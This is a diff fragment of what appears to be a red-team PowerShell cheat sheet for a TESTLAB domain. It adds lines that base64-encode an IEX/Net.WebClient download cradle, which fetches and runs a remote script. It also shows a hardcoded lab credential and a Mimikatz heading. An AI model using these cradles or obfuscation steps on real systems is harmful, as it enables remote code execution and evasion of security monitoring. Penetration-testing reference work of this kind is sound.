@@ -8,6 +8,10 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-S
 # Create credential object
 $SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+
+# Encoded command
+$string = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')"
+$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
 ```
 
 ### Mimikatz
